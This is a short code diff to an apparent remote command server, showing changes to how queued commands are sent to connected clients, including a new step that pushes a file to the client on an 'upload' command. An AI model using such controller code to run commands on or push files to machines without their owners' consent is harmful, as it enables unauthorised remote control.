@@ -41,11 +41,17 @@ def handle_client(conn, addr, command_queue):
             if not command_queue.empty():
                 # prepare the command
                 command = command_queue.get()
+                command = command.replace('"', '')
                 command = client.command_controller(command.lower())
 
                 # Send the command to the client
                 if command != "help" and command != "unknown" and command != "error":
                     conn.send(command.encode('utf-8'))
+
+                    if command.startswith("upload"):
+                        file_path = command.split(" ")[1]
+                        lib.upload_file(file_path, conn)
+
 
                     # If the command is "close", close the connection
                     if command == "close":
@@ -158,6 +164,7 @@ def command_line_interface():
             print("ID   TID   \n--   ---  ")
             for thread_id in threads:
                 print(f"{thread_id}   {threads[thread_id]}")
+            print("\n")
             lib.print_mko_prefix()
 
         elif command == "exit":
